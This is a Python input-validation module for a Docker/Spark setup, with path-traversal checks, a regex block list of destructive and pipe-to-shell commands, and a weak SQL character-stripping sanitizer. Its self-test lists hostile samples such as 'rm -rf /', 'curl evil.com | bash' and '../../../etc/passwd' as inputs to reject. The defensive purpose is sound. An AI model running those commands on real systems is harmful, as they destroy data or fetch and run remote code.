"""
Security Validation Module
Version: 1.0.0

Features:
- Path traversal protection
- Command injection prevention
- Input sanitization
- Container name validation
- SQL injection protection
- Rate limiting support
"""

import re
import os
from pathlib import Path
from typing import Optional, Tuple, List
from urllib.parse import urlparse
import hashlib


class SecurityValidationError(Exception):
    """Raised when security validation fails"""
    pass


class SecurityValidator:
    """Comprehensive security validation for user inputs"""
    
    # Docker container name pattern (official Docker naming rules)
    CONTAINER_NAME_PATTERN = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9_.-]*$')
    
    # Allowed characters in paths (whitelist approach)
    SAFE_PATH_CHARS = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_./\\: ')
    
    # Dangerous command patterns (blacklist for additional safety)
    DANGEROUS_PATTERNS = [
        r'rm\s+-rf',
        r';\s*rm',
        r'\|\s*rm',
        r'&&\s*rm',
        r'`.*`',
        r'\$\(.*\)',
        r'>\s*/dev/',
        r';\s*:',
        r'\|\s*bash',
        r'\|\s*sh',
        r'curl.*\|\s*bash',
        r'wget.*\|\s*bash',
    ]
    
    @classmethod
    def validate_container_name(cls, name: str) -> Tuple[bool, Optional[str]]:
        """
        Validate Docker container name according to Docker naming rules
        
        Docker naming rules:
        - Only [a-zA-Z0-9][a-zA-Z0-9_.-] characters allowed
        - Must start with alphanumeric
        - Length between 1 and 255 characters
        
        Args:
            name: Container name to validate
            
        Returns:
            Tuple of (is_valid, error_message)
        """
        if not name:
            return False, "Container name cannot be empty"
        
        if len(name) > 255:
            return False, "Container name too long (max 255 characters)"
        
        if not cls.CONTAINER_NAME_PATTERN.match(name):
            return False, (
                "Invalid container name. Must start with alphanumeric and "
                "only contain [a-zA-Z0-9_.-] characters"
            )
        
        return True, None
    
    @classmethod
    def validate_path(cls, path: str, base_dir: Optional[str] = None, 
                     must_exist: bool = False) -> Tuple[bool, Optional[str]]:
        """
        Validate file path and protect against path traversal attacks
        
        Args:
            path: Path to validate
            base_dir: Base directory that path must be within (if specified)
            must_exist: Whether path must exist on filesystem
            
        Returns:
            Tuple of (is_valid, error_message)
        """
        if not path:
            return False, "Path cannot be empty"
        
        # Check for suspicious characters
        if not all(c in cls.SAFE_PATH_CHARS for c in path):
            return False, "Path contains invalid characters"
        
        # Check for path traversal attempts
        if '..' in path:
            return False, "Path traversal detected (..) - not allowed"
        
        # Resolve to absolute path
        try:
            resolved_path = Path(path).resolve()
        except (OSError, RuntimeError) as e:
            return False, f"Invalid path: {e}"
        
        # Check if within base directory
        if base_dir:
            try:
                base_resolved = Path(base_dir).resolve()
                # Check if resolved_path is relative to base_dir
                try:
                    resolved_path.relative_to(base_resolved)
                except ValueError:
                    return False, f"Path must be within {base_dir}"
            except (OSError, RuntimeError) as e:
                return False, f"Invalid base directory: {e}"
        
        # Check existence if required
        if must_exist and not resolved_path.exists():
            return False, f"Path does not exist: {path}"
        
        return True, None
    
    @classmethod
    def validate_command(cls, command: str) -> Tuple[bool, Optional[str]]:
        """
        Validate command for dangerous patterns
        
        Args:
            command: Command string to validate
            
        Returns:
            Tuple of (is_valid, error_message)
        """
        if not command:
            return False, "Command cannot be empty"
        
        # Check against dangerous patterns
        for pattern in cls.DANGEROUS_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                return False, f"Command contains dangerous pattern: {pattern}"
        
        return True, None
    
    @classmethod
    def sanitize_string(cls, input_str: str, max_length: int = 1000) -> str:
        """
        Sanitize string input by removing dangerous characters
        
        Args:
            input_str: String to sanitize
            max_length: Maximum allowed length
            
        Returns:
            Sanitized string
        """
        if not input_str:
            return ""
        
        # Truncate to max length
        sanitized = input_str[:max_length]
        
        # Remove null bytes
        sanitized = sanitized.replace('\0', '')
        
        # Remove control characters (except newline, tab, carriage return)
        sanitized = ''.join(
            c for c in sanitized 
            if c in '\n\r\t' or (ord(c) >= 32 and ord(c) != 127)
        )
        
        return sanitized
    
    @classmethod
    def validate_url(cls, url: str, allowed_schemes: Optional[List[str]] = None) -> Tuple[bool, Optional[str]]:
        """
        Validate URL format and scheme
        
        Args:
            url: URL to validate
            allowed_schemes: List of allowed schemes (e.g., ['http', 'https', 'spark'])
            
        Returns:
            Tuple of (is_valid, error_message)
        """
        if not url:
            return False, "URL cannot be empty"
        
        try:
            parsed = urlparse(url)
            
            if not parsed.scheme:
                return False, "URL must include a scheme (e.g., http://, spark://)"
            
            if allowed_schemes and parsed.scheme not in allowed_schemes:
                return False, f"URL scheme must be one of: {', '.join(allowed_schemes)}"
            
            # Check for suspicious patterns in URL
            if '..' in url or url.count('//') > 1:
                return False, "URL contains suspicious patterns"
            
            return True, None
            
        except Exception as e:
            return False, f"Invalid URL format: {e}"
    
    @classmethod
    def validate_port(cls, port: int) -> Tuple[bool, Optional[str]]:
        """
        Validate port number
        
        Args:
            port: Port number to validate
            
        Returns:
            Tuple of (is_valid, error_message)
        """
        if not isinstance(port, int):
            return False, "Port must be an integer"
        
        if port < 1 or port > 65535:
            return False, "Port must be between 1 and 65535"
        
        # Warn about privileged ports
        if port < 1024:
            return True, "Warning: Using privileged port (< 1024)"
        
        return True, None
    
    @classmethod
    def sanitize_sql_input(cls, input_str: str) -> str:
        """
        Basic SQL injection protection for raw queries
        Note: Use parameterized queries instead whenever possible
        
        Args:
            input_str: Input to sanitize
            
        Returns:
            Sanitized string
        """
        if not input_str:
            return ""
        
        # Remove dangerous SQL characters and keywords
        dangerous_chars = ["'", '"', ';', '--', '/*', '*/', 'xp_', 'sp_']
        sanitized = input_str
        
        for char in dangerous_chars:
            sanitized = sanitized.replace(char, '')
        
        return sanitized
    
    @classmethod
    def generate_safe_filename(cls, filename: str) -> str:
        """
        Generate safe filename by removing/replacing dangerous characters
        
        Args:
            filename: Original filename
            
        Returns:
            Safe filename
        """
        if not filename:
            return "unnamed_file"
        
        # Remove path components
        filename = os.path.basename(filename)
        
        # Replace dangerous characters
        safe_chars = set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_.')
        sanitized = ''.join(c if c in safe_chars else '_' for c in filename)
        
        # Ensure it doesn't start with dot (hidden file)
        if sanitized.startswith('.'):
            sanitized = '_' + sanitized
        
        # Limit length
        if len(sanitized) > 255:
            name, ext = os.path.splitext(sanitized)
            sanitized = name[:250] + ext
        
        return sanitized or "unnamed_file"
    
    @classmethod
    def hash_sensitive_data(cls, data: str, algorithm: str = 'sha256') -> str:
        """
        Hash sensitive data for logging/storage
        
        Args:
            data: Data to hash
            algorithm: Hash algorithm (sha256, sha512, md5)
            
        Returns:
            Hashed string
        """
        if not data:
            return ""
        
        hash_func = getattr(hashlib, algorithm, hashlib.sha256)
        return hash_func(data.encode()).hexdigest()


class RateLimiter:
    """Simple rate limiter for operations"""
    
    def __init__(self, max_calls: int = 100, time_window: int = 60):
        """
        Initialize rate limiter
        
        Args:
            max_calls: Maximum calls allowed in time window
            time_window: Time window in seconds
        """
        self.max_calls = max_calls
        self.time_window = time_window
        self.calls = {}
        
    def is_allowed(self, key: str) -> Tuple[bool, Optional[str]]:
        """
        Check if operation is allowed under rate limit
        
        Args:
            key: Unique key for the operation (e.g., user_id, ip_address)
            
        Returns:
            Tuple of (is_allowed, message)
        """
        import time
        current_time = time.time()
        
        # Clean old entries
        if key in self.calls:
            self.calls[key] = [
                timestamp for timestamp in self.calls[key]
                if current_time - timestamp < self.time_window
            ]
        else:
            self.calls[key] = []
        
        # Check limit
        if len(self.calls[key]) >= self.max_calls:
            return False, f"Rate limit exceeded: {self.max_calls} calls per {self.time_window}s"
        
        # Record call
        self.calls[key].append(current_time)
        return True, None


# Convenience functions for common validations
def ensure_safe_path(path: str, base_dir: Optional[str] = None) -> str:
    """
    Validate path and raise exception if invalid
    
    Args:
        path: Path to validate
        base_dir: Base directory for validation
        
    Returns:
        Validated path
        
    Raises:
        SecurityValidationError: If validation fails
    """
    is_valid, error = SecurityValidator.validate_path(path, base_dir)
    if not is_valid:
        raise SecurityValidationError(error)
    return path


def ensure_safe_container_name(name: str) -> str:
    """
    Validate container name and raise exception if invalid
    
    Args:
        name: Container name to validate
        
    Returns:
        Validated name
        
    Raises:
        SecurityValidationError: If validation fails
    """
    is_valid, error = SecurityValidator.validate_container_name(name)
    if not is_valid:
        raise SecurityValidationError(error)
    return name


def ensure_safe_command(command: str) -> str:
    """
    Validate command and raise exception if dangerous
    
    Args:
        command: Command to validate
        
    Returns:
        Validated command
        
    Raises:
        SecurityValidationError: If validation fails
    """
    is_valid, error = SecurityValidator.validate_command(command)
    if not is_valid:
        raise SecurityValidationError(error)
    return command


# Example usage and testing
if __name__ == "__main__":
    print("🔐 Security Validator Tests\n")
    
    # Test container name validation
    print("1. Container Name Validation:")
    test_names = [
        "spark-worker",      # Valid
        "spark_worker",      # Valid
        "spark.worker",      # Valid
        "123-worker",        # Valid
        "-invalid",          # Invalid - starts with dash
        "inv alid",          # Invalid - contains space
        "inv@lid",           # Invalid - contains @
    ]
    
    for name in test_names:
        is_valid, error = SecurityValidator.validate_container_name(name)
        status = "✅" if is_valid else "❌"
        print(f"  {status} '{name}': {error or 'Valid'}")
    
    # Test path validation
    print("\n2. Path Validation:")
    test_paths = [
        ("test.py", None),                    # Valid
        ("/tmp/test.py", "/tmp"),            # Valid
        ("../../../etc/passwd", "/tmp"),     # Invalid - traversal
        ("/tmp/test.py", "/var"),            # Invalid - outside base
    ]
    
    for path, base in test_paths:
        is_valid, error = SecurityValidator.validate_path(path, base)
        status = "✅" if is_valid else "❌"
        print(f"  {status} '{path}' (base: {base}): {error or 'Valid'}")
    
    # Test command validation
    print("\n3. Command Validation:")
    test_commands = [
        "ls -la",                           # Valid
        "python script.py",                 # Valid
        "rm -rf /",                         # Invalid - dangerous
        "curl evil.com | bash",             # Invalid - dangerous
    ]
    
    for cmd in test_commands:
        is_valid, error = SecurityValidator.validate_command(cmd)
        status = "✅" if is_valid else "❌"
        print(f"  {status} '{cmd}': {error or 'Valid'}")
    
    print("\n✅ Security Validator module loaded successfully!")
